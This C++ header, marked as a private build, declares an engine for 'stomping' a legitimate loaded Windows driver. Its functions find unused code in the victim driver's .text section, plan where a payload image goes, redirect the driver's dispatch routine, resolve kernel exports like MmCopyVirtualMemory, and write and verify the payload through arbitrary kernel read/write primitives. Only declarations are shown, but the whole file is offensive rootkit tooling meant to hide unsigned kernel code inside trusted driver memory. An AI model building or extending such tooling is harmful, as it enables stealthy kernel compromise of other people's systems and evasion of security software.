// stomp.h — image-backed stomp engine (private build; do not publish)
#pragma once
#include <cstdint>
#include <string>
#include <vector>
#include <windows.h>

struct KernelPrimitives;   // mapper.hpp — full def at include site

namespace stomp {

struct DeadFunc { uint32_t rva_start; uint32_t size; };

struct VictimImage {
    std::wstring name, disk_path;
    uint64_t loaded_base = 0;
    uint32_t image_size = 0;
    uint64_t preferred_base = 0;
    uint32_t text_rva = 0, text_vsize = 0, text_raw_ptr = 0, text_raw_size = 0;
    uint32_t text_used_high_rva = 0;   // last RVA with live code in .text (CC-run heuristic)
    std::vector<uint8_t> raw;
    std::vector<DeadFunc> all_funcs;   // CC-bounded regions in .text
    std::vector<DeadFunc> dead_funcs;
};

struct StompPlan {
    std::wstring victim_name;
    std::wstring victim_dos_name;
    uint64_t victim_base = 0;
    uint64_t victim_driver_object = 0;
    uint64_t orig_dispatch = 0;
    uint32_t thunk_rva = 0;
    uint32_t payload_rva = 0;
    uint32_t payload_size = 0;
};

uint32_t PeSizeOfImage(const std::vector<uint8_t>& payloadFile);

bool LookupVictimDosName(const wchar_t* shortName, std::wstring& moduleName, std::wstring& dosName);
/// Core storage/filter stack — placement may succeed but live patch often bugchecks (0x3B).
bool VictimBlockedForLiveStomp(const wchar_t* shortName);

bool EnumerateVictim(const std::wstring& victimName, VictimImage& out);
/// Host / guest usermode: load %SystemRoot%\System32\drivers\<victim>.sys (no kernel module list).
bool EnumerateVictimFromDisk(const wchar_t* shortName, VictimImage& out);
bool AnalyzeDeadCode(VictimImage& img);
uint32_t MaxTextCcRun(const VictimImage& img);
uint32_t MaxSafeTextSpan(const VictimImage& img, uint32_t payload_SizeOfImage = 0);
bool PlanPlacement(const VictimImage& img, uint32_t payload_SizeOfImage, StompPlan& out);

bool ResolveDriverObjectFromHandle(KernelPrimitives& prim, HANDLE hDev, uint64_t& driverObjectKva);

uint64_t ResolveKernelExport(KernelPrimitives& prim, uint64_t kernelBase, const char* exportName);

bool ApplyStomp(KernelPrimitives& prim, const VictimImage& img, StompPlan& plan,
    uint64_t kernelBase, uint64_t pMmGetSystemRoutineAddress,
    uint64_t pMmCopyVirtualMemory, uint32_t sweepMask,
    std::vector<uint8_t>& payloadMapped);

bool VerifyStomp(KernelPrimitives& prim, const StompPlan& plan,
    const std::vector<uint8_t>& payloadMapped, size_t checkBytes);

} // namespace stomp